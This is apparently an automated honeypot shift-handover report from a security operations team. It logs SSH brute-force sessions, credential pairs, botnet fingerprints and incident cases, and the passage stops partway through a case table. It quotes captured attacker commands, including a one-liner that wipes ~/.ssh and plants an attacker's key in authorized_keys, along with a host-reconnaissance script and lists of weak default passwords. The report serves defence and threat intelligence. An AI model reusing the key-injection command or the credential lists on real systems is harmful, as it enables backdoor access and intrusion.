# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-01 |
| **Generated At** | 2026-08-01T15:04:27Z |
| **Shift Time** | 15:04 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **181** |
| Confirmed Threats | **167** |
| False Positives Filtered | **14** (7.7%) |
| Unique Attacker IPs | **66** |
| Countries of Origin | **22** |
| High Severity Cases | **119** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **62** |
| Malware Samples Analyzed | **3** HIGH · **27** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **142** |
| Unique Credential Pairs | **99** |
| Unique Usernames | **23** |
| Unique Passwords | **91** |
| Successful Auth Pairs | **125** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 55 |
| `admin` | 28 |
| `default` | 8 |
| `supervisor` | 7 |
| `lghkel	` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `qwer1234` | 6 |
| `zpz}ld	` | 6 |
| `admin` | 5 |
| `` | 4 |
| `support` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `default` | `qwer1234` | 6 |
| `lghkel	` | `zpz}ld	` | 6 |
| `root` | `` | 4 |
| `support` | `support` | 4 |
| `supervisor` | `supervisor33` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `password1` | `195.178.110.227` | 2026-08-01T12:56:20 |
| `root` | `qwerty` | `195.178.110.227` | 2026-08-01T12:58:06 |
| `root` | `r00t` | `195.178.110.227` | 2026-08-01T12:59:58 |
| `root` | `root!@#` | `195.178.110.227` | 2026-08-01T13:03:51 |
| `root` | `root#123` | `195.178.110.227` | 2026-08-01T13:05:36 |
| `unknown` | `unknown123456789` | `109.233.21.109` | 2026-08-01T13:06:34 |
| `root` | `root0000` | `195.178.110.227` | 2026-08-01T13:07:18 |
| `root` | `root1111` | `195.178.110.227` | 2026-08-01T13:09:05 |
| `supervisor` | `letmein` | `61.12.86.90` | 2026-08-01T13:09:33 |
| `root` | `root123` | `195.178.110.227` | 2026-08-01T13:10:49 |
| `root` | `root1234` | `195.178.110.227` | 2026-08-01T13:12:31 |
| `root` | `root2024` | `195.178.110.227` | 2026-08-01T13:14:16 |
| `root` | `root2222` | `195.178.110.227` | 2026-08-01T13:16:05 |
| `root` | `root321` | `195.178.110.227` | 2026-08-01T13:17:52 |
| `root` | `root4444` | `195.178.110.227` | 2026-08-01T13:19:44 |
| `root` | `root5555` | `195.178.110.227` | 2026-08-01T13:21:26 |
| `root` | `root5678` | `195.178.110.227` | 2026-08-01T13:23:12 |
| `support` | `support` | `176.53.159.196` | 2026-08-01T13:24:56 |
| `root` | `root6666` | `195.178.110.227` | 2026-08-01T13:24:59 |
| `default` | `default6` | `78.187.9.111` | 2026-08-01T13:25:01 |
| `default` | `default6` | `107.135.117.245` | 2026-08-01T13:25:07 |
| `root` | `ubuntu` | `185.113.9.199` | 2026-08-01T13:26:04 |
| `root` | `root9999` | `195.178.110.227` | 2026-08-01T13:26:38 |
| `test` | `test1234567890` | `10.0.0.73` | 2026-08-01T13:27:10 |
| `root` | `root@123` | `195.178.110.227` | 2026-08-01T13:28:15 |
| `admin` | `admin` | `116.99.172.125` | 2026-08-01T13:29:00 |
| `root` | `rootaccess` | `195.178.110.227` | 2026-08-01T13:29:51 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-01T13:30:47 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-01T13:30:47 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-01T13:30:48 |
| `root` | `admin` | `116.99.172.125` | 2026-08-01T13:31:24 |
| `root` | `rootadmin` | `195.178.110.227` | 2026-08-01T13:31:28 |
| `supervisor` | `supervisor5` | `10.0.0.73` | 2026-08-01T13:32:46 |
| `root` | `rootme` | `195.178.110.227` | 2026-08-01T13:33:07 |
| `root` | `123456789` | `20.227.140.178` | 2026-08-01T13:33:11 |
| `root` | `rootpass` | `195.178.110.227` | 2026-08-01T13:34:47 |
| `installer` | `installer` | `116.110.151.49` | 2026-08-01T13:34:54 |
| `user` | `user` | `116.110.144.94` | 2026-08-01T13:34:57 |
| `root` | `rootpw` | `195.178.110.227` | 2026-08-01T13:36:25 |
| `ubnt` | `ubnt` | `116.110.151.49` | 2026-08-01T13:37:28 |
| `root` | `rootroot` | `195.178.110.227` | 2026-08-01T13:38:10 |
| `root` | `toor` | `195.178.110.227` | 2026-08-01T13:39:59 |
| `squid` | `squid` | `116.110.151.49` | 2026-08-01T13:40:19 |
| `config` | `config` | `116.110.144.94` | 2026-08-01T13:41:33 |
| `root` | `welcome` | `195.178.110.227` | 2026-08-01T13:41:49 |
| `admin` | `1234` | `195.178.110.227` | 2026-08-01T13:43:39 |
| `support` | `support` | `116.110.151.49` | 2026-08-01T13:44:29 |
| `test` | `test1234567890` | `31.173.0.46` | 2026-08-01T13:44:54 |
| `admin` | `12345` | `195.178.110.227` | 2026-08-01T13:45:32 |
| `root` | `@` | `116.110.144.94` | 2026-08-01T13:47:06 |
| `admin` | `123456` | `195.178.110.227` | 2026-08-01T13:47:23 |
| `admin` | `123456789` | `195.178.110.227` | 2026-08-01T13:49:02 |
| `support` | `support` | `10.0.0.73` | 2026-08-01T13:49:09 |
| `root` | `1995` | `152.32.182.8` | 2026-08-01T13:49:21 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-01T13:49:22 |
| `345gs5662d34` | `345gs5662d34` | `152.32.182.8` | 2026-08-01T13:49:23 |
| `root` | `3245gs5662d34` | `152.32.182.8` | 2026-08-01T13:49:23 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-01T13:49:25 |
| `admin` | `admin@123` | `116.110.144.94` | 2026-08-01T13:50:04 |
| `admin` | `Admin@123` | `195.178.110.227` | 2026-08-01T13:50:37 |
| `root` | `root123` | `116.110.151.49` | 2026-08-01T13:51:49 |
| `admin` | `P@ssw0rd` | `195.178.110.227` | 2026-08-01T13:52:11 |
| `admin` | `admin` | `195.178.110.227` | 2026-08-01T13:53:43 |
| `system` | `OkwKcECs8qJP2Z` | `116.110.144.94` | 2026-08-01T13:54:17 |
| `admin` | `admin#123` | `195.178.110.227` | 2026-08-01T13:55:17 |
| `guest` | `guest` | `116.110.144.94` | 2026-08-01T13:55:56 |
| `test` | `test` | `116.110.144.94` | 2026-08-01T13:56:27 |
| `admin` | `admin1` | `195.178.110.227` | 2026-08-01T13:56:58 |
| `default` | `qwer1234` | `10.0.0.73` | 2026-08-01T13:58:22 |
| `admin` | `admin123` | `195.178.110.227` | 2026-08-01T13:58:40 |
| `admin` | `0l0ctyQh243O63uD` | `116.110.151.49` | 2026-08-01T13:58:47 |
| `default` | `qwer1234` | `65.181.79.60` | 2026-08-01T14:00:05 |
| `default` | `qwer1234` | `210.0.90.81` | 2026-08-01T14:00:15 |
| `admin` | `admin2024` | `195.178.110.227` | 2026-08-01T14:00:20 |
| `admin` | `password` | `116.110.144.94` | 2026-08-01T14:01:12 |
| `admin` | `admin@123` | `195.178.110.227` | 2026-08-01T14:01:57 |
| `root` | `Killer` | `182.93.50.90` | 2026-08-01T14:02:35 |
| `345gs5662d34` | `345gs5662d34` | `182.93.50.90` | 2026-08-01T14:02:40 |
| `root` | `3245gs5662d34` | `182.93.50.90` | 2026-08-01T14:02:42 |
| `admin` | `adminadmin` | `195.178.110.227` | 2026-08-01T14:03:34 |
| `admin` | `1234` | `116.110.151.49` | 2026-08-01T14:04:22 |
| `admin` | `default` | `195.178.110.227` | 2026-08-01T14:05:13 |
| `admin` | `admin01` | `116.110.144.94` | 2026-08-01T14:05:56 |
| `root` | `Pa$$word.123` | `217.154.106.153` | 2026-08-01T14:06:23 |
| `345gs5662d34` | `345gs5662d34` | `217.154.106.153` | 2026-08-01T14:06:26 |
| `root` | `3245gs5662d34` | `217.154.106.153` | 2026-08-01T14:06:27 |
| `admin` | `123456` | `116.110.151.49` | 2026-08-01T14:06:45 |
| `admin` | `letmein` | `195.178.110.227` | 2026-08-01T14:06:50 |
| `unknown` | `7777777777` | `10.0.0.73` | 2026-08-01T14:07:54 |
| `admin` | `pass@123` | `195.178.110.227` | 2026-08-01T14:08:27 |
| `admin` | `password` | `195.178.110.227` | 2026-08-01T14:10:09 |
| `admin` | `admin123` | `116.110.151.49` | 2026-08-01T14:10:49 |
| `admin` | `welcome1` | `195.178.110.227` | 2026-08-01T14:11:51 |
| `user` | `1234` | `116.110.144.94` | 2026-08-01T14:12:02 |
| `ansible` | `12345` | `195.178.110.227` | 2026-08-01T14:13:29 |
| `ansible` | `123456` | `195.178.110.227` | 2026-08-01T14:15:08 |
| `ftp` | `ftp` | `116.110.151.49` | 2026-08-01T14:15:21 |
| `ansible` | `123456789` | `195.178.110.227` | 2026-08-01T14:16:45 |
| `default` | `qwer1234` | `182.73.164.228` | 2026-08-01T14:17:00 |
| `default` | `qwer1234` | `85.152.57.60` | 2026-08-01T14:17:11 |
| `ansible` | `ansible` | `195.178.110.227` | 2026-08-01T14:18:20 |
| `operator` | `operator` | `116.110.151.49` | 2026-08-01T14:18:37 |
| `ansible` | `ansible123` | `195.178.110.227` | 2026-08-01T14:19:57 |
| `ubnt` | `ubnt99` | `78.186.54.65` | 2026-08-01T14:20:09 |
| `support` | `admin` | `116.110.144.94` | 2026-08-01T14:20:14 |
| `ubnt` | `ubnt99` | `203.198.173.137` | 2026-08-01T14:20:17 |
| `root` | `ipscan` | `116.110.144.94` | 2026-08-01T14:21:00 |
| `root` | `abcd1234` | `116.110.151.49` | 2026-08-01T14:23:55 |
| `unknown` | `7777777777` | `46.48.134.131` | 2026-08-01T14:27:08 |
| `supervisor` | `supervisor33` | `10.0.0.73` | 2026-08-01T14:33:42 |
| `root` | `root123` | `20.227.140.178` | 2026-08-01T14:34:06 |
| `supervisor` | `supervisor33` | `218.15.224.102` | 2026-08-01T14:35:30 |
| `supervisor` | `supervisor33` | `122.166.253.226` | 2026-08-01T14:35:39 |
| `support` | `support` | `118.38.44.223` | 2026-08-01T14:45:04 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xc8\xd7\xc4\xc6\xc8'` | `118.38.44.223` | 2026-08-01T14:45:39 |
| `lghkel	` | `zpz}ld	` | `118.38.44.223` | 2026-08-01T14:45:39 |
| `b'\xda\xdb\xd8\xdf\xcb\xd2\xca'` | `b'\xdf\xd0\xca\xcd\xd2\xcf'` | `118.38.44.223` | 2026-08-01T14:46:13 |
| `b'\xd9\xcb\xdb\xcd\xca'` | `b'\x8f\x8c\x8d\x8a\x8b'` | `118.38.44.223` | 2026-08-01T14:46:47 |
| `root` | `fidel123` | `118.38.44.223` | 2026-08-01T14:47:22 |
| `admin` | `admin` | `167.148.33.174` | 2026-08-01T14:47:34 |
| `b'\xdf\xda\xd3\xd7\xd0'` | `b'\x8f\x8c\x8d\x8a\x8b\x88'` | `118.38.44.223` | 2026-08-01T14:47:56 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xfa\x8f\x8d\xd6\xd6\xe5'` | `118.38.44.223` | 2026-08-01T14:48:30 |
| `admin` | `ZmqVfoSIP` | `118.38.44.223` | 2026-08-01T14:49:04 |
| `b'\xda\xdb\xd8\xdf\xcb\xd2\xca'` | `b'\xda\xdb\xd8\xdf\xcb\xd2\xca'` | `118.38.44.223` | 2026-08-01T14:49:39 |
| `root` | `xc3511` | `118.38.44.223` | 2026-08-01T14:50:14 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **181** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 59 |
| AsyncSSH (Python) | 28 |
| OpenSSH | 16 |
| libssh | 15 |
| Paramiko (Python) | 6 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 50 | 1 |
| `fda360b1b4f4...` | Mirai/variant | 28 | 3 |
| `acaa53e0a7d7...` | Mirai/variant | 16 | 16 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |
| `f555226df196...` | Mirai/variant | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 50 | 1 | Mirai/variant |
| `fda360b1b4f4...` | AsyncSSH (Python) | 28 | 3 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 16 | 16 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 49 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.227`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `217.154.106.153`, `182.93.50.90`, `152.32.182.8`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **66** |
| Unique ASNs | **51** |
| High-Risk ASNs | **44** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS24086` | Viettel Corporation | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 2 | HIGH |
| `AS48721` | Flyservers S.A. | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (119)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4a3532fcaec2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:56 |
| **Last Seen** | 2026-08-01 12:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:56:19` | `cowrie.session.connect` |
| `2026-08-01 12:56:19` | `cowrie.client.version` |
| `2026-08-01 12:56:19` | `cowrie.client.kex` |
| `2026-08-01 12:56:20` | `cowrie.login.success` |
| `2026-08-01 12:56:21` | `cowrie.session.params` |
| `2026-08-01 12:56:21` | `cowrie.command.input` |
| `2026-08-01 12:56:21` | `cowrie.command.input` |
| `2026-08-01 12:56:21` | `cowrie.command.input` |
| `2026-08-01 12:56:21` | `cowrie.command.input` |
| `2026-08-01 12:56:21` | `cowrie.command.input` |
| `2026-08-01 12:56:21` | `cowrie.command.success` |
| `2026-08-01 12:56:21` | `cowrie.command.input` |
| `2026-08-01 12:56:21` | `cowrie.command.input` |
| `2026-08-01 12:56:21` | `cowrie.command.input` |
| `2026-08-01 12:56:21` | `cowrie.command.input` |
| `2026-08-01 12:56:22` | `cowrie.log.closed` |
| `2026-08-01 12:56:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6591f9eb407

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:58 |
| **Last Seen** | 2026-08-01 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:58:05` | `cowrie.session.connect` |
| `2026-08-01 12:58:05` | `cowrie.client.version` |
| `2026-08-01 12:58:05` | `cowrie.client.kex` |
| `2026-08-01 12:58:06` | `cowrie.login.success` |
| `2026-08-01 12:58:07` | `cowrie.session.params` |
| `2026-08-01 12:58:07` | `cowrie.command.input` |
| `2026-08-01 12:58:07` | `cowrie.command.input` |
| `2026-08-01 12:58:07` | `cowrie.command.input` |
| `2026-08-01 12:58:07` | `cowrie.command.input` |
| `2026-08-01 12:58:07` | `cowrie.command.input` |
| `2026-08-01 12:58:07` | `cowrie.command.success` |
| `2026-08-01 12:58:07` | `cowrie.command.input` |
| `2026-08-01 12:58:07` | `cowrie.command.input` |
| `2026-08-01 12:58:07` | `cowrie.command.input` |
| `2026-08-01 12:58:07` | `cowrie.command.input` |
| `2026-08-01 12:58:07` | `cowrie.log.closed` |
| `2026-08-01 12:58:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2024bcc86c8c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:59 |
| **Last Seen** | 2026-08-01 12:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:59:57` | `cowrie.session.connect` |
| `2026-08-01 12:59:57` | `cowrie.client.version` |
| `2026-08-01 12:59:57` | `cowrie.client.kex` |
| `2026-08-01 12:59:58` | `cowrie.login.success` |
| `2026-08-01 12:59:59` | `cowrie.session.params` |
| `2026-08-01 12:59:59` | `cowrie.command.input` |
| `2026-08-01 12:59:59` | `cowrie.command.input` |
| `2026-08-01 12:59:59` | `cowrie.command.input` |
| `2026-08-01 12:59:59` | `cowrie.command.input` |
| `2026-08-01 12:59:59` | `cowrie.command.input` |
| `2026-08-01 12:59:59` | `cowrie.command.success` |
| `2026-08-01 12:59:59` | `cowrie.command.input` |
| `2026-08-01 12:59:59` | `cowrie.command.input` |
| `2026-08-01 12:59:59` | `cowrie.command.input` |
| `2026-08-01 12:59:59` | `cowrie.command.input` |
| `2026-08-01 12:59:59` | `cowrie.log.closed` |
| `2026-08-01 12:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a41c83679de7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:03 |
| **Last Seen** | 2026-08-01 13:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:03:49` | `cowrie.session.connect` |
| `2026-08-01 13:03:50` | `cowrie.client.version` |
| `2026-08-01 13:03:50` | `cowrie.client.kex` |
| `2026-08-01 13:03:51` | `cowrie.login.success` |
| `2026-08-01 13:03:52` | `cowrie.session.params` |
| `2026-08-01 13:03:52` | `cowrie.command.input` |
| `2026-08-01 13:03:52` | `cowrie.command.input` |
| `2026-08-01 13:03:52` | `cowrie.command.input` |
| `2026-08-01 13:03:52` | `cowrie.command.input` |
| `2026-08-01 13:03:52` | `cowrie.command.input` |
| `2026-08-01 13:03:52` | `cowrie.command.success` |
| `2026-08-01 13:03:52` | `cowrie.command.input` |
| `2026-08-01 13:03:52` | `cowrie.command.input` |
| `2026-08-01 13:03:52` | `cowrie.command.input` |
| `2026-08-01 13:03:52` | `cowrie.command.input` |
| `2026-08-01 13:03:52` | `cowrie.log.closed` |
| `2026-08-01 13:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38ece4318eed

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:05 |
| **Last Seen** | 2026-08-01 13:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:05:34` | `cowrie.session.connect` |
| `2026-08-01 13:05:34` | `cowrie.client.version` |
| `2026-08-01 13:05:34` | `cowrie.client.kex` |
| `2026-08-01 13:05:36` | `cowrie.login.success` |
| `2026-08-01 13:05:37` | `cowrie.session.params` |
| `2026-08-01 13:05:37` | `cowrie.command.input` |
| `2026-08-01 13:05:37` | `cowrie.command.input` |
| `2026-08-01 13:05:37` | `cowrie.command.input` |
| `2026-08-01 13:05:37` | `cowrie.command.input` |
| `2026-08-01 13:05:37` | `cowrie.command.input` |
| `2026-08-01 13:05:37` | `cowrie.command.success` |
| `2026-08-01 13:05:37` | `cowrie.command.input` |
| `2026-08-01 13:05:37` | `cowrie.command.input` |
| `2026-08-01 13:05:37` | `cowrie.command.input` |
| `2026-08-01 13:05:37` | `cowrie.command.input` |
| `2026-08-01 13:05:37` | `cowrie.log.closed` |
| `2026-08-01 13:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7d2c16fffca

| Field | Detail |
|---|---|
| **Source IP** | `109.233.21[.]109` |
| **First Seen** | 2026-08-01 13:06 |
| **Last Seen** | 2026-08-01 13:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:06:33` | `cowrie.session.connect` |
| `2026-08-01 13:06:33` | `cowrie.client.version` |
| `2026-08-01 13:06:33` | `cowrie.client.kex` |
| `2026-08-01 13:06:34` | `cowrie.login.success` |
